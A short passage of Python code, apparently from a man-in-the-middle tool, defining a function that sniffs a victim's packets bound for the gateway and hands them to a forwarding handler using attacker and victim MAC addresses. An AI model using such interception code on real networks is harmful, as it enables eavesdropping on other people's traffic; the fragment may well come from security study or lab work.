...
def victim2gw(default_gw_mac,gw_ip ,attack_mac , victim_mac , victim_ip, seconds_to_run):
    sniff(filter = f"src host {victim_ip} and dst host {gw_ip}", prn=lambda packet: victim_to_gw_handler(packet, default_gw_mac, gw_ip ,attack_mac , victim_mac , victim_ip), timeout=seconds_to_run)
